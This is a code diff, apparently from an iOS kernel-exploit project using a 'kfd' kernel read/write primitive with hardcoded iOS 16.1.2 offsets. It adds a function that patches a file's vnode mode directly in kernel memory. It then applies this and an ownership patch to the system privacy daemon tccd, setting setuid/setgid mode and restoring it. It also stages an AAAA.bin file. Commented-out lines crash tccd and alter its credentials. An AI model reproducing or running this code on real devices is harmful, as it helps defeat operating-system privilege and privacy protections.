@@ -183,7 +183,7 @@ int funUcred(u64 kfd, uint64_t proc) {
     return 0;
 }
 
-uint64_t funVnode(u64 kfd, uint64_t proc, char* filename) {
+uint64_t funVnodeHide(u64 kfd, char* filename) {
     //16.1.2 offsets
     uint32_t off_p_pfd = 0xf8;
     uint32_t off_fd_ofiles = 0;
@@ -195,6 +195,8 @@ uint64_t funVnode(u64 kfd, uint64_t proc, char* filename) {
     
     int file_index = open(filename, O_RDONLY);
     if (file_index == -1) return -1;
+    
+    uint64_t proc = getProc(kfd, getpid());
     
     //get vnode
     uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
@@ -282,7 +284,41 @@ uint64_t funVnodeChown(u64 kfd, char* filename, uid_t uid, gid_t gid) {
     return 0;
 }
 
-uint64_t funVnodeOverwrite(u64 kfd, uint64_t proc, char* to, char* from) {
+uint64_t funVnodeChmod(u64 kfd, char* filename, mode_t mode) {
+    uint32_t off_p_pfd = 0xf8;
+    uint32_t off_vnode_v_data = 0xe0;
+    uint32_t off_fp_fglob = 0x10;
+    uint32_t off_fg_data = 0x38;
+    
+    int file_index = open(filename, O_RDONLY);
+    if (file_index == -1) return -1;
+    
+    uint64_t proc = getProc(kfd, getpid());
+
+    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
+    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
+    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
+    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
+    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
+    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
+    uint64_t vnode = vnode_pac | 0xffffff8000000000;
+    uint64_t v_data = kread64(kfd, vnode + off_vnode_v_data);
+    uint32_t v_mode = kread32(kfd, v_data + 0x88);
+    
+    close(file_index);
+    
+    printf("[i] Patching %s vnode->v_mode %o -> %o\n", filename, v_mode, mode);
+    kwrite32(kfd, v_data+0x88, mode);
+    
+    struct stat file_stat;
+    if(stat(filename, &file_stat) == 0) {
+        printf("[i] %s mode: %o\n", filename, file_stat.st_mode);
+    }
+    
+    return 0;
+}
+
+uint64_t funVnodeOverwrite(u64 kfd, char* to, char* from) {
     //16.1.2 offsets
     uint32_t off_p_pfd = 0xf8;
     uint32_t off_fd_ofiles = 0;
@@ -304,6 +340,8 @@ uint64_t funVnodeOverwrite(u64 kfd, uint64_t proc, char* to, char* from) {
     
     int file_index = open(to, O_RDONLY);
     if (file_index == -1) return -1;
+    
+    uint64_t proc = getProc(kfd, getpid());
     
     //get vnode
     uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
@@ -431,10 +469,15 @@ uint64_t funVnodeOverwrite(u64 kfd, uint64_t proc, char* to, char* from) {
 //    //    from_fd_vnode = kread64(kfd, from_v_data + 32);
 ////    printf("[i] vnode, %s from_vnode->v_data->fd_vnode: 0x%llx\n", from, from_fd_vnode);// <- vnode
 //
-//    for (int i=0; i<200; i++) {
-//        printf("[i] from_vnode->v_data + 0x%x: 0x%llx\n", i*8, kread64(kfd, from_v_data+i*8));
-//    }
-//
+//    chmod(from, 0644);
+//    printf("[i] from_vnode->v_data + 0x88: 0x%x\n", kread32(kfd, from_v_data+0x88));
+//    chmod(from, 0107777);
+//    printf("[i] from_vnode->v_data + 0x88: 0x%x\n", kread32(kfd, from_v_data+0x88));
+//    kwrite32(kfd, from_v_data+0x88, 0107777);
+//    printf("Changed mode to 0107777, preserving 20 secs");
+//    sleep(20);
+//    kwrite32(kfd, from_v_data+0x88, 0644);
+////
 //    int i = 0x80;
 //    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
 //    i += 1;
@@ -554,12 +597,35 @@ int do_fun(u64 kfd) {
     
     funUcred(kfd, selfProc);
     funProc(kfd, selfProc);
-    funVnode(kfd, selfProc, "/System/Library/Audio/UISounds/photoShutter.caf");
+    funVnodeHide(kfd, "/System/Library/Audio/UISounds/photoShutter.caf");
     funCSFlags(kfd, "launchd");
     funTask(kfd, "kfd");
     
+    //Patch
     funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
+    //Restore
     funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0, 0);
+    
+    
+    //Patch
+    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0107777);
+    //Restore
+    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
+    
+    NSString *AAAApath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/AAAA.bin"];
+    remove(AAAApath.UTF8String);
+    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"] toPath:AAAApath error:nil];
+    
+    
+//    xpc_crasher("com.apple.tccd");
+//    xpc_crasher("com.apple.tccd");
+//    sleep(10);
+//    funUcred(kfd, getProc(kfd, getPidByName(kfd, "tccd")));
+//    funProc(kfd, getProc(kfd, getPidByName(kfd, "tccd")));
+//    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
+    
+    
+//    funVnodeOverwrite(kfd, AAAApath.UTF8String, AAAApath.UTF8String);
     
 //    funVnodeOverwrite(kfd, selfProc, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", copyToAppDocs.UTF8String);
 
